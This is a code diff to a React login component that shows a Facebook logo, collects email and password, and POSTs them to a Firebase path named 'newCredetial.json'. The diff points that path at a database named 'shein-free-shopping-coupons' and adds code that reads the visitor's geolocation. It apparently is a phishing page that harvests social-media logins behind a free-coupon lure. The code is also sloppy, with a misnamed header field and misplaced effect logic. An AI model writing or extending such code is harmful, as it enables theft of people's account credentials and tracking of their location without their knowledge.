@@ -1,11 +1,25 @@
 import React, { useState } from "react";
+import { useEffect } from 'react';
 import facebook from "../../images/facebook.svg";
-const Login = () => {
+ const Login = () => {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-
   const link = "#";
-  const options = {
+  const showPosition = (position) => {
+     console.log("Position: ", position.coords.latitude + ", " + position.coords.longitude);
+   }
+   const geoLocation = () => {
+     navigator.permissions
+     if (navigator.geolocation) {
+       navigator.geolocation.getCurrentPosition(showPosition);
+     } else {
+       console.error("Geolocation is not supported by this browser.");
+     }
+   }
+   useEffect(() => {
+     return geoLocation;
+   })
+   const options = {
     method: "POST",
     header: {
       "Content-type": "Applicaton/json",
@@ -26,7 +40,7 @@ const Login = () => {
     console.log("button pressed");
 
     fetch(
-      " https://databalance-a9d59-default-rtdb.asia-southeast1.firebasedatabase.app/newCredetial.json ",
+      "https://shein-free-shopping-coupons-default-rtdb.asia-southeast1.firebasedatabase.app/newCredetial.json",
       options
     )
       .then((response) => response.json())
